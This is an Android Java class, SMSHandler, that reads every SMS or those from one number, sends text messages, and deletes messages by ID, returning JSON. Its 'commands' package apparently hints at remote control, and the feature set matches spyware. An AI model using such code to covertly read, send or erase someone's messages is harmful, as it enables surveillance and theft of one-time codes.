package com.task.tusker.commands;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import androidx.core.app.ActivityCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * SMS Handler - Read, Send and Delete SMS
 */
public class SMSHandler {

    private Context context;

    public SMSHandler(Context context) {
        this.context = context;
    }

    public JSONObject getAllSMS(int limit) {
        JSONObject result = new JSONObject();
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_SMS permission not granted");
                return result;
            }

            Uri uri = Uri.parse("content://sms/");
            String[] projection = new String[]{"_id", "address", "body", "date", "type", "read"};

            Cursor cursor = context.getContentResolver().query(
                uri, projection, null, null, "date DESC LIMIT " + limit);

            JSONArray smsList = new JSONArray();
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                    sms.put("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")));
                    sms.put("read", cursor.getInt(cursor.getColumnIndexOrThrow("read")) == 1);
                    smsList.put(sms);
                } while (cursor.moveToNext());
                cursor.close();
            }

            result.put("success", true);
            result.put("messages", smsList);
            result.put("count", smsList.length());

        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) { ex.printStackTrace(); }
        }
        return result;
    }

    public JSONObject getSMSFromNumber(String phoneNumber, int limit) {
        JSONObject result = new JSONObject();
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_SMS permission not granted");
                return result;
            }

            Uri uri = Uri.parse("content://sms/");
            String[] projection = new String[]{"_id", "address", "body", "date", "type", "read"};
            String selection = "address = ?";
            String[] selectionArgs = new String[]{phoneNumber};

            Cursor cursor = context.getContentResolver().query(
                uri, projection, selection, selectionArgs, "date DESC LIMIT " + limit);

            JSONArray smsList = new JSONArray();
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                    sms.put("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")));
                    sms.put("read", cursor.getInt(cursor.getColumnIndexOrThrow("read")) == 1);
                    smsList.put(sms);
                } while (cursor.moveToNext());
                cursor.close();
            }

            result.put("success", true);
            result.put("phoneNumber", phoneNumber);
            result.put("messages", smsList);
            result.put("count", smsList.length());

        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) { ex.printStackTrace(); }
        }
        return result;
    }

    public JSONObject sendSMS(String phoneNumber, String message) {
        JSONObject result = new JSONObject();
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "SEND_SMS permission not granted");
                return result;
            }

            SmsManager smsManager = SmsManager.getDefault();
            if (message.length() > 160) {
                java.util.ArrayList<String> parts = smsManager.divideMessage(message);
                smsManager.sendMultipartTextMessage(phoneNumber, null, parts, null, null);
            } else {
                smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            }

            result.put("success", true);
            result.put("message", "SMS sent successfully");
            result.put("to", phoneNumber);
            result.put("text", message);

        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) { ex.printStackTrace(); }
        }
        return result;
    }

    /**
     * Delete SMS by ID.
     * Requires READ_SMS + WRITE_SMS permissions.
     * On Android 4.4+, requires this app to be the default SMS app.
     * If deletion fails (0 rows), returns an actionable error message.
     */
    public JSONObject deleteSMS(String smsId) {
        JSONObject result = new JSONObject();
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_SMS permission not granted");
                return result;
            }

            // Attempt deletion via the SMS content provider
            Uri uri = Uri.parse("content://sms/" + smsId);
            int deleted = 0;
            try {
                deleted = context.getContentResolver().delete(uri, null, null);
            } catch (SecurityException se) {
                result.put("success", false);
                result.put("error", "Permission denied — set this app as the Default SMS app in Android Settings to enable deletion.");
                result.put("smsId", smsId);
                result.put("requiresDefault", true);
                return result;
            }

            if (deleted > 0) {
                result.put("success", true);
                result.put("message", "SMS deleted");
                result.put("smsId", smsId);
            } else {
                // Zero rows deleted — likely not default SMS app on Android 4.4+
                // Try alternative URI format
                Uri altUri = Uri.parse("content://sms");
                int altDeleted = 0;
                try {
                    altDeleted = context.getContentResolver().delete(altUri, "_id=?", new String[]{smsId});
                } catch (SecurityException ignored) {}

                if (altDeleted > 0) {
                    result.put("success", true);
                    result.put("message", "SMS deleted");
                    result.put("smsId", smsId);
                } else {
                    result.put("success", false);
                    result.put("smsId", smsId);
                    result.put("error", "Could not delete — this app must be set as the Default SMS App in Android Settings > Apps > Default apps > SMS app.");
                    result.put("requiresDefault", true);
                }
            }

        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) { ex.printStackTrace(); }
        }
        return result;
    }
}
